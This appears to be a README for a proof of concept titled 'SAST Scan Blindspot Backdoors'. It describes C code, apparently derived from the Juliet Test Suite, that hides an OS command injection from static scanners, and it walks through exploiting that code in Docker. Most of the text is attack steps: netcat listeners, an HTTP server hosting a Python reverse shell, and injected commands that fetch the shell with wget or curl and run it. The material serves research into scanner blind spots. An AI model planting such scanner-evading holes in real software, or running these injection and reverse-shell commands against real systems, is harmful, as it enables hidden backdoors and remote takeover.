# SAST Scan Blindspot Backdoors
Example of vulnerable code with supporting exploit implementation whose data/control flow make it difficult for eneterprise static vulnerability scanners to detect problems with.

# Dockerized PoC for OS Command Injection RCE
*(Associated C code scans clean for command injection in most SAST tools)*

1. Build the Docker image
```
sudo docker build --progress=plain -t cwe78-poc-rce .
```
2. Run the Docker image interactively
```
sudo docker run --rm --network host -it --entrypoint /bin/sh cwe78-poc-rce
```
3. On local machine, set up listeners on ports 4444 and 4445 in two different terminals
```
nc -nvlp 4444
nc -nvlp 4445
```
4. Set up a http server in the directory with the python reverse shell script
```
sudo python3 -m http.server 80
```
5. In the docker shell, run the PoC binary
```
build/CWE78_OS_Command_Injection__char_connect_socket_execl_32
```
6. From the listener on port 4444, inject an OS command after the expected ls parameter. For example:
```
. && wget 127.0.0.1/shell.py && python shell.py
```
or
```
. && curl http://127.0.0.1/shell.py -o shell.py && python shell.py
``` 
(The buffer for reading input is 100 characters, so we need to host the script somewhere and grab it rather than entering here)

Finally, the http server should show that the python shell was requested and a shell should appear on the port 4445 listener.

## References
[Juliet Test Suite](https://samate.nist.gov/SARD/test-suites/112)
